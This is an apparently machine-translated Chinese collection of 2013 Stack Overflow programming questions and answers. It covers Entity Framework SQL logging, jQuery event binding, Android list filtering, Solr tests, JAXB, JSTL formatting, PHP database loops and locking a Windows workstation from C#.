我希望能够记录长时间运行的实体框架 linq 查询，以便调查正在生成的内容。我发现有一个实体框架 linq 查询，如果我在 Visual Studio 调试器中将鼠标悬停在它上面，它会向我显示生成的 SQL 的字符串表示形式，实体框架将发送到 SQL 服务器。

我想知道如何获取此字符串以便将其打印到日志文件中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T18:09:29.693

你试过了吗`ToString()`？

```
var query = context.Products.Where(p=>p.IsActive);
var queryText = query.ToString(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T18:03:51.030

看看这个[实体框架的日志记录提供程序](http://code.msdn.microsoft.com/EFProviderWrappers-c0b88f32)

# c# - 如何从数据库中将图像检索到循环中的4个图片框

> ID：15392953
> 
> 赞同：0
> 
> 时间：2013-03-13T17:58:47.367
> 
> 标签：c#, database, winforms, picturebox

我有一个 winform 应用程序（VS 2008），它有 4 个图片框，一个按钮（上传）。当我单击按钮时，我想从数据库（sql server 2005）中按从头到尾的顺序记录图像框。例如：按下按钮，第一个图片框显示第一张图片，按下按钮，第二张图片显示另一个图片框等等。然后第一个图片框显示第五张图片。

```
pb1 = img1, pb2 = img2, pb3 = img3, pb4 = img4, pb1 = img5,..pb4 = img8,pb1 = img9,..etc.. 
```

所以，有一个循环。我有这段代码，但他在图片框中只记录了一张图像。

```
private void btnSHow_Click(object sender, EventArgs e)
{
    SqlConnection connect = new SqlConnection("Data Source=JOHNO-PC\\SQLEXPRESS;Initial Catalog=DB_TraficSigns;Integrated Security=True");
    SqlCommand command = new SqlCommand("SELECT picture FROM Tab_Sign ORDER BY id", connect);

    SqlDataAdapter dp = new SqlDataAdapter(command);
    DataSet ds = new DataSet("Tab_Sign");

    byte[] MyData = new byte[0];

    dp.Fill(ds, "Tab_Sign");
    DataRow myRow;
    myRow = ds.Tables["Tab_Sign"].Rows[0];

    MyData = (byte[])myRow["picture"];

    MemoryStream stream = new MemoryStream(MyData);
    pb1.Image = Image.FromStream(stream);

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:08:24.110

不要使用 pb1、pb2、pb3 等，而是将您的图片框放在一个名为 pictureBoxes 之类的数组中。将数组的大小放在全局中，并在声明数组时使用该大小（因此，如果您添加或删除图片框，它很容易更改。）

```
int pictureBoxCount = 4;
int currentPictureBox = 0;
PictureBox[] pictureBoxes = new PictureBox[pictureBoxCount]; 
```

然后，每次下载图片时，更新数组索引器。

```
currentPictureBox = (currentPictureBox + 1) % pictureBoxCount; 
```

然后，您可以执行以下操作：

```
pictureBoxes[currentPictureBox].Image = Image.FromStream(stream); 
```

# iphone - 在 iPhone App 中的浏览器内登录 Stackoverflow Facebook

> ID：15392955
> 
> 赞同：1
> 
> 时间：2013-03-13T17:58:48.403
> 
> 标签：iphone, login, oauth, qr-code, facebook-login

[我在这里为http://stackoverflow.com](http://stackoverflow.com)创建了一个二维码：http : [//imageshack.us/scaled/landing/801/l1s8dhttp3a2f2fstackove.png](http://imageshack.us/scaled/landing/801/l1s8dhttp3a2f2fstackove.png)

接下来，使用我的 iPhone 4 (iOS 6.1.2)，我[使用](https://itunes.apple.com/en/app/qr-reader-for-iphone/id368494609)带有“inside-浏览器”并尝试使用 Facebook 登录 stackoverflow，但它给了我这个错误：“发生错误。请稍后再试。”

我只有 iPhone“内部浏览器”的这种行为，有什么解释吗？

提前致谢。

# jquery - jQuery 为一个动作使用两种方法

> ID：15392968
> 
> 赞同：0
> 
> 时间：2013-03-13T17:59:27.297
> 
> 标签：jquery

有一个输入并使用自己的网格。并`keypress`用于提交输入值，我想使用单击保存按钮并运行按键操作。

例如：

```
$('input[name="name"] , #save_button').live('keypress', function(event) {}) 
```

输入必须`keypressed`并且`#save_button`必须单击，我可以使用此方法运行一个函数以保存在数据库中吗？

对不起我的英语不好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:08:26.810

不要使用`.live`它已弃用的，`.on`而是使用它。如果你这样做了

```
 $('input[name="name"] , #save_button').on('keypress click', function() {
     // do something
 }); 
```

然后，如果用户单击输入，那么`//do something`如果用户单击`#save_button`. 如果我们希望用户通过点击来使用输入，那么点击输入不应该和`#save_button`. 所以真的这些需要分成两个听众

```
 $('input[name="name"]').on('keyup', function(e){
        // do something for keyup (use keyup instead, its just better)
 });

 $('#save_button').on('click', function(){
       // do something for click
 }); 
```

如果你想让两个听众做同样的事情

```
 function doSomething(){
     // do something for both
 }

 $('input[name="name"]').on('keyup', doSomething);

 $('#save_button').on('click', doSomething); 
```

如果您真的需要听众“活着”，那么您可以从文档中委派

```
 function doSomething(){
     // do something for both
 }

 $(document).on('keyup', 'input[name="name"]', doSomething);

 $(document).on('click', '#save_button', doSomething); 
```

还假设您不希望所有按键事件采取行动，而只希望一些键（如 ENTER 键），您可能想看看这个

[http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes](http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T18:04:32.820

使用命名函数并使用两个不同的事件。

```
function myFnc function(event) {}

var doc = $(document);
doc.on("keypress", 'input[name="name"]', myFnc);
doc.on("click", "#save_button", myFnc); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T18:16:36.097

两种主要方法：

*   通过给它一个名称来取消匿名处理程序，然后将其移动到两个 $(...).on(...) 语句（不是`.live()`）都可以访问的外部范围，然后在这些语句中按名称附加它。
*   像当前一样附加处理程序，并使用 jQuerys`.trigger()`方法从附加到“保存”按钮的匿名单击处理程序调用按键处理程序。

在这两种情况下，您都需要采取措施确保`event`传递给按键处理程序的格式正确，以便在从其他事件类型触发函数时避免错误。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-13T18:17:41.883

我相信您只想在按键后保存数据

```
var isKeypressed = false;
$('input[name="name"]').on('keypress', function(event) {
isKeypressed   =true;

});

$('#save_button').on('click', function(){
 if(isKeypressed ){
   saveData(); 
 }else{
    // your message
}

}); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-03-13T18:05:22.850

首先避免使用 live ，因为它已被弃用。如果您使用 jQuery 1.7 或更高版本，请使用`on`. 例如：

```
var handler = function(e) {
//Handle the event
};
$(document).on( "keypress", 'input[name="name"], #save_button', handler); 
```

# android - C4droid 上的 int 主重新定义错误

> ID：15392974
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:59:39.440
> 
> 标签：android, c++, gcc, g++

我在我的 android 设备上使用 c4droid(c++)(g++ + 仿生编译器)，早期工作的代码在 2-3 小时后运行时出现错误！！

说真的，对错误一无所知，但有一个观察结果，在重新安装应用程序时，我看到问题消失了，但只是暂时的！

***代码***

```
 // program with file handling search , display and modify functions
    #include<iostream>
    #include<fstream>
    #include<string>
    using namespace std;
    ofstream f("bank.dat", ios::app);

     int n = 0, flag = 0;
     struct bac
         {
           char name[10];
           char amt[5];
          } s;

    void add()
    { 
        cout << "\nenter the details ";
        cin >> s.name >> s.amt;
        f.write((char *)&s, sizeof(bac));

    }

    void ser()
    {
        ifstream fa("bank.dat");
        fa.seekg(0);
        char x[10];
        cout << "\nenter value to be searched ";
        cin >> x;

        while (fa && flag == 0)
        {
            n++;
        fa.read((char *)&s, sizeof(bac));
        if (strcmp(s.name, x) == 0)
        {
            flag = 1;
            break;
        }
    }
    if (flag == 1)
    {
        cout << "\nfound";
        cout << "\nAmount " << s.amt;
    }

}

void mod()
{
    ser();
    cout<<" "<<n;
    if (flag == 1)
    {
        f.seekp((n - 1) * sizeof(bac));
    //  cout<<f.tellp();
        cout<<"\nnew details ";
        add();
        }
    }

    int main()
    {f.seekp(0);
        int ch;

            cout << "\nBANK MANAGEMENT SYSTEM \n";
            cout << "enter choice ";
            cout << "\n1.add\n2.search\n3.delete and overwrite ";
            cin >> ch;
            if (ch == 1)
            {
                add();
            }
            if (ch == 2)
            {
                ser();
            }
            if (ch == 3)
            {
                mod();
            }

        return 0;
    } 
```

***更新***

即使这个程序给出了同样的错误

```
#include<iostream>
using namespace std;
int main()
{
return 0;
} 
```

***ERROR***错误：'int main()' 编译的重新定义因 -Wfatal - 错误而终止 -</p>

代码逻辑上不正确，但确实用来编译！我需要知道究竟是什么导致了问题，以及代码在早期编译和运行时也是如此！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T17:02:37.410

我很可能在与您的程序相同的目录中有一个名为系统头文件的源代码。重新安装应用程序并将文件重命名并将文件传输到其他位置就可以了

# c# - 存储对象列表并将一个属性标识为快速查找的键

> ID：15392977
> 
> 赞同：0
> 
> 时间：2013-03-13T17:59:43.880
> 
> 标签：c#, list, object, dictionary, key-value

假设我有一个 storyCharacter 对象列表。每个对象都存储一个 ID#、名称和最喜欢的颜色，如下例所示：

```
ID#   |  Name        |  Favorite Color
21    |  Optimus     |  Blue
29    |  Ironhide    |  Red
34    |  Starscream  |  White 
```

什么是创建键值对以便将其键入 ID# 的最佳方法。

我知道我可以使用字典，但会

```
dictionary.Add(storyCharacter1.IDnum, storyCharacter1); 
```

做一个好方法吗？我假设这种方式会将 ID 的副本作为键，从而不必要地占用更多内存，因为该信息已经在对象中。当然，我可以不将 IDnum 存储在 storyCharacter 对象中，而只是将其用作键。因为这会创建一个只有名称和颜色的对象，然后与 IDnum 的键相关联，所以感觉就像我正在解耦应该保持在一起的数据。

我也可以使用 List<>，但是我必须要么 foreach 并查看，要么使用 LINQ。

那么，有没有办法存储（某种）对象列表，并将该对象的一个​​元素标识为键？如果没有，有什么替代方法可以做类似的事情，它们是什么权衡？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:07:26.567

创建这样的字典是加快查找速度的一种常见且完全有效的方法。使用更多内存来获得更多性能是一种常见的权衡。

如果 IDNum 是 a `double`（我对此表示怀疑），字典最多将使用每个键 8 个字节，除了每个键将使用 4 个字节。如果 IDNum 是一个对象，它不会复制整个对象，只是对它的引用（在 32 位系统上占用 4 个字节）。

但是……你真的有记忆问题吗？这是在嵌入式设备上还是内存不足的东西上？过早的优化（对于速度和内存）通常是一件坏事。我会采用您的整体设计并稍后解决内存/性能问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T18:07:45.983

您说的是内存中的数据存储，它只是...内存。

您要求执行此操作的“最佳方式”，但未指定任何条件。好吧，在内存中存储对象集合的推荐方法是使用数组或`List<>`. 是的，使用 LINQ 遍历它。LINQ 得到了很好的优化，包括一些运行时优化，您的用例不太可能是这种方法太慢或使用太多内存的用例。

如果您的数据集确实那么大（在这种情况下，内存中似乎是一个糟糕的选择）并且您担心查找时间`Dictionary<>`会给您带来相当稳定的性能。

但也许您想要的实际上是对象数据库之类的东西，请考虑[db4o](http://nuget.org/packages/db4o-devel/)。或文档数据库，考虑[RavenDb](http://nuget.org/packages?q=ravendb)（或 monogo、redis 等） - Raven 具有嵌入式模式，允许您在进程中运行它。

同样，对于内存中的东西，这都是迂腐的——即使是相当大的数据集，我也从未见过仅仅使用内置函数`Dictionary<>`是一个问题。

# java - 过滤后无法显示列表视图数据

> ID：15392978
> 
> 赞同：0
> 
> 时间：2013-03-13T17:59:44.387
> 
> 标签：java, android

我有一个 listview 适配器过滤器，它使用 like 语句正确过滤我输入的文本。

我遇到的问题是，当我的应用程序加载时，所有数据都显示在列表视图中。当应用过滤器时，它会正确过滤到提供的文本，**我不能做的是，一旦编辑文本再次为空白（即搜索字符串被删除），所有数据都会重新显示在列表视图中。**

以下屏幕截图显示了该问题：

加载列表：

![在此处输入图像描述](../Images/8e29d89595dbb73dd4a5b80a8807e85d.png)

过滤文本“a”。苹果按预期显示：

![在此处输入图像描述](../Images/3a494c24c6970e101f213ba4d72da49f.png)

问题：删除“a”后，不会重新加载列表视图。

![在此处输入图像描述](../Images/33e5d22d8769d8794ccabf986915dc32.png)

过滤器代码：

```
 itemNameEdit = (EditText) findViewById(R.id.inputName);

    showItems.setTextFilterEnabled(true);

    itemNameEdit.addTextChangedListener(new TextWatcher()
     {

        @Override
        public void afterTextChanged(Editable s) {

        }

        @Override
        public void beforeTextChanged(CharSequence s, int start, int count,
                int after) {

        }

        @Override
        public void onTextChanged(CharSequence s, int start, int before,
                int count) {

            cursorAdapter.getFilter().filter(s.toString());

        }

     });

    getCons = new DBHandlerShop (this, null, null);

     cursorAdapter.setFilterQueryProvider(new FilterQueryProvider()
    {
        public Cursor runQuery(CharSequence constraint)
        {

            getCons.open();
            return getCons.getChanges(constraint.toString());

        }

    });
     showItems.setAdapter(cursorAdapter); 
```

getChanges 方法：

```
public Cursor getChanges(String constraintPassed) {

        String [] columns = new String[]{KEY_ROWSHOPID, KEY_ITEMSHOP, KEY_ITEMNUM, KEY_ITEMPRICE};
        Cursor c = null;
         if(constraintPassed == "" || constraintPassed.length() == 0)
         {
             c = ourDatabase.query(DATABASE_TABLESHOP, columns, null, null, null, KEY_ITEMSHOP + " ASC", null); 

         }

         else
         {

            c = ourDatabase.query(DATABASE_TABLESHOP, columns, KEY_ITEMSHOP + " LIKE'" + constraintPassed + "%'", null, null, null, KEY_ITEMSHOP + " ASC", null);

         }

        if( c != null)
            {
                c.moveToFirst();
                //return c;

            }
        return c;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T20:29:31.637

我注意到您正在使用：

```
if(constraintPassed == "" || constraintPassed.length() == 0) 
```

你永远不应该使用`==`字符串，你必须使用`equals()`.
但在这种情况下，您可以只使用`constraintPassed.length() == 0`或：

```
if(constraintPassed.isEmpty()) 
```

（请阅读[如何比较 Java 中的字符串？](https://stackoverflow.com/q/513832/1267661)`==`了解和之间的区别`equals()`。）

# maven - 覆盖 getSchemaFile 和 getSolrConfigFile

> ID：15392979
> 
> 赞同：1
> 
> 时间：2013-03-13T17:59:44.830
> 
> 标签：maven, solr, overriding, solrj, solr4

我正在将我的 Solr 测试项目迁移到 Solr 4.1，但我无法覆盖 getSchemaFile() 和 getSolrConfigFile() 方法。

我收到以下错误：

> [错误] my_path/SolrConfigTest.java:[63,15] 错误：SolrConfigTest 中的 getSchemaFile() 无法覆盖 SolrTestCaseJ4 中的 getSchemaFile()
> 
> [错误] 被覆盖的方法是静态的
> 
> [错误] my_path/SolrConfigTest.java:[62,1] 错误：方法没有覆盖或实现超类型中的方法
> 
> [错误] my_path/SolrConfigTest.java:[68,15] 错误：SolrConfigTest 中的 getSolrConfigFile() 无法覆盖 SolrTestCaseJ4 中的 getSolrConfigFile()
> 
> [错误] 被覆盖的方法是静态的
> 
> [错误] my_path/SolrConfigTest.java:[67,1] 错误：方法没有覆盖或实现超类型中的方法

该文件如下所示：

```
import org.apache.log4j.Logger;
import org.apache.solr.client.solrj.SolrServer;
import org.apache.solr.client.solrj.SolrServerException;
import org.apache.solr.client.solrj.embedded.EmbeddedSolrServer;
import org.apache.solr.client.solrj.request.AbstractUpdateRequest;
import org.apache.solr.client.solrj.request.ContentStreamUpdateRequest;
import org.apache.solr.client.solrj.request.CoreAdminRequest;
import org.apache.solr.client.solrj.response.QueryResponse;
import org.apache.solr.common.params.ModifiableSolrParams;
import org.apache.solr.common.util.NamedList;
import org.apache.solr.core.CoreContainer;
import org.apache.solr.util.AbstractSolrTestCase;

public class SolrConfigTest extends AbstractSolrTestCase {
    String container = "mycore";

    @Override
    public String getSolrHome() {
        return System.getProperty("user.dir") + "/resources/";
    }

    @Override
    public String getSchemaFile() {
        return getSolrHome() + container + "/conf/schema.xml";
    }

    @Override
    public String getSolrConfigFile() {
        return getSolrHome() + container + "/conf/solrconfig.xml";
    }

    @Before
    @Override
    public void setUp() throws Exception {
        super.setUp();
        CoreContainer.Initializer initializer = new CoreContainer.Initializer();
        coreContainer = initializer.initialize();
        server = new EmbeddedSolrServer(coreContainer, "mycore");
    }
} 
```

对于 maven，我的 pom.xml 文件具有以下依赖项：

```
<dependencies>
    <dependency>
        <groupId>log4j</groupId>
        <artifactId>log4j</artifactId>
        <version>1.2.17</version>
    </dependency>
    <dependency>
        <groupId>org.apache.lucene</groupId>
        <artifactId>lucene-core</artifactId>
        <version>4.1.0</version>
    </dependency>
    <dependency>
        <groupId>org.apache.solr</groupId>
        <artifactId>solr-core</artifactId>
        <version>4.1.0</version>
    </dependency>
    <dependency>
       <groupId>org.apache.solr</groupId>
       <artifactId>solr-solrj</artifactId>
       <version>4.1.0</version>
    </dependency>
    <dependency>
        <groupId>org.apache.solr</groupId>
        <artifactId>solr-test-framework</artifactId>
        <version>4.1.0</version>
    </dependency>
</dependencies> 
```

有人知道我缺少什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T12:12:12.570

据我所知，Solr 4.1 中的 AbstractSolrTestCase 类不再提供方法 getSchemaFile() 和 getSolrConfigFile() 来覆盖。

一旦 getSolrHome() 指向定义 Solr 的文件夹（您可以在其中找到 solr.xml 文件），就会在 mycore/conf 中找到 schema.xml 和 solrconfig.xml 文件。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-10-31T06:27:52.213

或者您可以覆盖 SolrTestCaseJ4 类的 initCore(String config, String schema, String solrHome) 方法，以便您可以根据您的配置设置配置文件和模式文件。

# java - 使用嵌套数组上传 jaxb bean 返回的状态 400

> ID：15392982
> 
> 赞同：1
> 
> 时间：2013-03-13T17:59:59.130
> 
> 标签：java, json, jaxb

我正在使用 java 和 glassfish 开发一个宁静的 web 服务。Web 服务使用 JSON。我创建了一个 JAXB bean，其中包含一些简单的字段以及其他 jaxb bean 的嵌套数组。我在下面包含了相关代码。

**当我只**用简单字段填充我的 bean 时，Web 服务会接受传入的 bean，对其进行处理并适当地返回。

当我添加嵌套的子 bean 数组时，我从服务器返回状态 400...我担心我注释 getter 方法的方式可能会影响整个 bean，因为它被传递到服务器？

我还添加了用于将 bean 推送到服务器的测试仪的代码

这是相关网络服务的方法签名：

```
@POST
@Path( "test1" )
@Consumes( MediaType.APPLICATION_JSON )
public Response createRecord( JAXB_ExampleBean track ) 
```

这是顶级bean：

```
@XmlRootElement( name = "example" )
@XmlType( propOrder = { "id", "idCreator", "title", "revList" } )
public class JAXB_ExampleBean
{
private long id = 0;
private long idCreator;
private String title;
private ArrayList<JAXB_ExampleRevBean> revList;

@XmlElementWrapper( name = "exampleList" )
@XmlElement( name = "exampleRevision" )
public ArrayList<JAXB_ExampleRevBean> getRevList()
{
    return revList;
}

    // other getters/setters omitted for brevity no additional annotations on them

} 
```

这是嵌套的bean：

```
@XmlRootElement( name = "exampleRevision" )
@XmlType( propOrder = { "id", "idExample", "idAuthor", "revOrder" } )
public class JAXB_ExampleRevBean
{
private long id = 0;
private long idExample;
private long idAuthor;
private int revOrder;

    // getters/setters omitted for brevity no additional annotations on them
} 
```

这是测试器代码：

```
WebResource webResource = client.resource( "http://example.com/resources/meta/test1" );

JAXB_ExampleBean beanToUpload = buildExampleBeanToSend();

ClientResponse response = webResource.type( "application/json" ).post( ClientResponse.class, beanToUpload );
if( response.getStatus() != 201 )
   throw new RuntimeException( "Failed : HTTP error code : " + response.getStatus() ); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:31:50.743

您应该尝试使用数组 [] 或 List 而不是 Arraylist。大多数序列化/反序列化框架不处理具体的集合类。

# jsp - JSTL formatNumber 标记正在为 utf-8 中的组分隔符生成未知字符

> ID：15392984
> 
> 赞同：1
> 
> 时间：2013-03-13T18:00:04.383
> 
> 标签：jsp, utf-8, internationalization, jstl

我正在尝试使用 JSTL formatNumber 标记在 JSP 页面中输出带有分组和小数位的数字，类似于以下内容：

```
<fmt:formatNumber value="${form.amount}" pattern='###,##0.00' /> 
```

如果在标签和页面指令中将编码设置为 ISO-8859-1，它适用于 lang=en、fr 和 es，但如果我将其设置为 UTF-8，则 lang=fr 不再正常工作。正如预期的那样，小数点变为逗号，但组分隔符变为�。

作为对格式的测试，我把模式省略了，所以我只有

```
<fmt:formatNumber value="${form.amount}" /> 
```

结果是一样的。

作为对编码的测试，我在页面中加入了一些 ISO-8859-1 不支持的法语字符，例如 Œ、œ 和非常罕见的 Ÿ，当编码为设置为 UTF-8，但是当编码设置为 ISO-8859-1 时，它们会出现乱码，正如预期的那样，所以看起来编码被正确设置为 UTF-8。浏览器还指示编码是 UTF-8。

这是一个 Spring 应用程序，它使用语言环境拦截器根据请求中的“语言”参数设置语言环境。

我还能尝试什么？

编辑：我想我已经弄清楚了，但我不确定为什么我所做的工作有效。我正在使用 Tiles，并且我有一个主 JSP 文件定义页面的布局，其中 4 个图块定义了元、页眉、主要和页脚区域的子页面。我最初只有在布局 JSP 中有 <%@ page pageEncoding="UTF-8"%> ，我认为 tile 定义会继承它，但似乎并非如此。我需要将该指令添加到每个页面，如果我想更改，这会很痛苦。它应该是这样工作的吗？

# html - HTML 在 JSP 与 HTML 文件中的显示方式不同

> ID：15392991
> 
> 赞同：0
> 
> 时间：2013-03-13T18:00:29.293
> 
> 标签：html, css, jsp, button

我的 Java Web 应用程序的 JSP 页面中有相当于非常基本的 HTML。我要做的关键是将文本包装在固定宽度的输入按钮（IE7）中。它在我的 JSP 中不起作用（文本被截断）。但是，如果我创建一个 HTML 文件并使用相同的浏览器打开它，它就可以正常工作。.JSP 和 .HTML 的内容相同，如下所示。我在这里想念什么？他们不应该表现得一样吗？

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Test</title>
</head>
<body>

    <input type="button" value="A lot of descriptive text on a button" style="width:100px; white-space:normal;" />

</body>
</html> 
```

# ruby-on-rails - Rails 中是否有类似于 java 标签库的东西？

> ID：15392994
> 
> 赞同：0
> 
> 时间：2013-03-13T18:00:41.140
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

Rails 中是否有类似于 java 标签库的东西？因此，您可以将（标准或客户）标签放在 .html.erb 文件中，标签会自动翻译成 html。

非常感谢！

# php - 如何使用函数的返回值？

> ID：15392997
> 
> 赞同：0
> 
> 时间：2013-03-13T18:00:51.427
> 
> 标签：php

我的 content.php 中有一个 while 循环，我想像参数一样使用 $result。如何从 content.php 文件中调用函数并在我的 while 循环中使用 $result？

```
 while ($row = mysql_fetch_array($result)) 
                {
                    $ename = stripslashes($row['name']);
                    $eemail = stripslashes($row['email']);
                    $ebox = stripslashes($row['lund']);
                    $ecategori = stripslashes($row['LundaBlogg']);
                    $epost = stripslashes($row['post']);
                    $grav_url = "http://www.gravatar.com/avatar.php?gravatar_id=".md5(strtolower($eemail))."&size=70";

                    echo
                    (
                        '<li> 
                            <div class="datum">'.$row['date'].'</div>
                            <div class="meta"><img src="'.$grav_url.'" alt="Gravatar" /><p>'.$ename.'</p></div>
                            </br>
                            <div class="categori"><p>Kategori: '.$ecategori.'</p></div>
                            <div class="topic"><p>'.$ebox.'</p></div>   
                            <div class="shout"><p>'.$epost.'</p></div>
                            <div class="raderaknapp"><a href="../delete_ac.php?id=' . $row['id'] . '"class=\"icon-2 info-tooltip\">Radera Inlägg</a></div>
                            <div class="raportpost"><p><a href="mailto:someone@example.com?Subject=Hello%20again">Rapportera inlägg</a></p></div>
                        </li>'
                    );

                    ?>
                        <h4>
                        <form action="<?php echo $self?>" method="POST">
                            <input type="hidden" name="id" value="<?php echo $row['id']?>"/>
                            <input type = "submit" name="Gilla" value = 'Gilla'"/>
                        </form>
                        </h4>

                        <div id="radera-infotwo">
                            <span onmouseover="ShowText('Messagetwo'); return true;" onmouseout="HideText('Messagetwo'); return true;" href="javascript:ShowText('Messagetwo')">
                                <img src="http://www.wallpaperama.com/forums/post-images/20081107_6718_question-mark.gif">
                            </span>
                        </div>  

                        <div id="radera-info">
                            <span onmouseover="ShowText('Message'); return true;" onmouseout="HideText('Message'); return true;" href="javascript:ShowText('Message')">
                                <img src="http://www.wallpaperama.com/forums/post-images/20081107_6718_question-mark.gif">
                            </span>
                        </div>

                        <?
                        ?>
                    <?

                    echo ("Antal Gilla: " .$row['likes']); 

                    if(isset($_POST['Gilla']) && $_POST['id'] == $row['id']){echo '<h5><img src="../images/tummen-upp.png"/>Du har Gillat detta inlägg.</h5>';}

                    echo "<hr>";  
                } 
```

这是我的 functions.php 文件，其中有我的函数 blogPosts_get()

```
function blogPosts_get(){ 
  $query = "SELECT * FROM shouts ORDER BY `id` DESC LIMIT 8;";
  $result = mysql_query($query) or die('<p class="error">Wrong.</p>');   
} 
```

我已经尝试在我的函数 blogPosts_get() 中返回，但我不明白它是如何工作的。有人可以帮我从我的函数 blogPosts_get() 中获取 $result 变量，以便我可以在我的 while 循环中使用它吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:15:49.267

首先将你的functions.php包含在content.php中`require_once(./'your path'/functions.php');`，它应该在你的文件content.php的开头，然后再将你的functions.php中的代码修改为：

```
function blogPosts_get(){ 
  $query = "SELECT * FROM shouts ORDER BY `id` DESC LIMIT 8;";
  $result = mysql_query($query) or die('<p class="error">Wrong.</p>');  
return $result; 
} 
```

当您在 content.php 中的循环之前调用它时，如下所示：

```
$result = blogPosts_get(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T18:09:52.280

首先，简单的方法是修改函数以获取结果并构建一个数组对象供您使用，而不是返回一个 MySQL 查询对象。

```
function blogPosts_get(){
    $query = "SELECT * FROM shouts ORDER BY `id` DESC LIMIT 8;";
    $result = mysql_query($query);
    if(!$result)
        return array();
    else{
        while($row = mysql_fetch_array($result))
            $posts[] = $row;
       return $posts;
   }  
} 
```

这将处理获取帖子，并将始终返回一个数组对象供您使用。

接下来，您必须确保包含带有`require`or的功能`require_once`。您可以通过以下方式调用它

```
$posts = blogPosts_get(); 
```

然后使用一个

```
foreach ($posts as $post){ 
```

**注意**：自 PHP 5.5 起，MySQL_* 已被弃用。使用 MySQLi_* 或 PDO。

# c# - 使用 Windows 服务的键盘敲击

> ID：15392999
> 
> 赞同：1
> 
> 时间：2013-03-13T18:00:58.577
> 
> 标签：c#, windows, windows-services

是否可以使用 Windows 服务模拟按键？例如，假设我有一个在后台运行的服务，只要发生触发器，例如触发器可能是下午 2:00，然后我会例如按窗口键 + L 来锁定计算机。这在 C# 中可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:05:43.457

我意识到你只想锁定你的电脑。

`Windows Logo`通过使用此代码，您可以像+一样锁定您的计算机`L`

```
[DllImport("user32")]
public static extern void LockWorkStation(); 
```

和时间。它可能看起来像这样。

```
DateTime d = DateTime.Now;
if (d.TimeOfDay.Hours >= youSettedTime)
{
  LockWorkStation();
} 
```

参考：[http ://social.msdn.microsoft.com/Forums/en-US/csharpgeneral/thread/7aab9893-430a-4aed-8d51-b8368a61860e/](http://social.msdn.microsoft.com/Forums/en-US/csharpgeneral/thread/7aab9893-430a-4aed-8d51-b8368a61860e/)